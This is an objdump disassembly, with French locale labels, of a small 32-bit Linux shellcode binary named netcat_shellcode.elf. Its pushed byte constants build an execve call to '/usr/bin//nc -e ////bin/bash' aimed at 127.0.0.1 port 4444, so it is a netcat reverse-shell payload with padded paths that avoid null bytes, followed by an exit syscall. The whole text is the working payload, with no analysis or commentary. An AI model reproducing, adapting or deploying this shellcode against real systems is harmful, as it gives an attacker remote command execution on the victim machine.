
netcat_shellcode.elf:     format de fichier elf32-i386


Déassemblage de la section .text :

08049000 <.text>:
 8049000:	31 c0                	xor    eax,eax
 8049002:	50                   	push   eax
 8049003:	68 2f 2f 6e 63       	push   0x636e2f2f
 8049008:	68 2f 62 69 6e       	push   0x6e69622f
 804900d:	68 2f 75 73 72       	push   0x7273752f
 8049012:	89 e3                	mov    ebx,esp
 8049014:	50                   	push   eax
 8049015:	66 68 2d 65          	pushw  0x652d
 8049019:	89 e1                	mov    ecx,esp
 804901b:	50                   	push   eax
 804901c:	68 62 61 73 68       	push   0x68736162
 8049021:	68 62 69 6e 2f       	push   0x2f6e6962
 8049026:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
 804902b:	89 e2                	mov    edx,esp
 804902d:	50                   	push   eax
 804902e:	68 2e 30 2e 31       	push   0x312e302e
 8049033:	68 30 30 30 30       	push   0x30303030
 8049038:	68 31 32 37 2e       	push   0x2e373231
 804903d:	89 e7                	mov    edi,esp
 804903f:	50                   	push   eax
 8049040:	68 34 34 34 34       	push   0x34343434
 8049045:	89 e6                	mov    esi,esp
 8049047:	50                   	push   eax
 8049048:	56                   	push   esi
 8049049:	57                   	push   edi
 804904a:	52                   	push   edx
 804904b:	51                   	push   ecx
 804904c:	53                   	push   ebx
 804904d:	89 e1                	mov    ecx,esp
 804904f:	31 d2                	xor    edx,edx
 8049051:	b0 0b                	mov    al,0xb
 8049053:	cd 80                	int    0x80
 8049055:	31 c0                	xor    eax,eax
 8049057:	b0 01                	mov    al,0x1
 8049059:	31 db                	xor    ebx,ebx
 804905b:	cd 80                	int    0x80
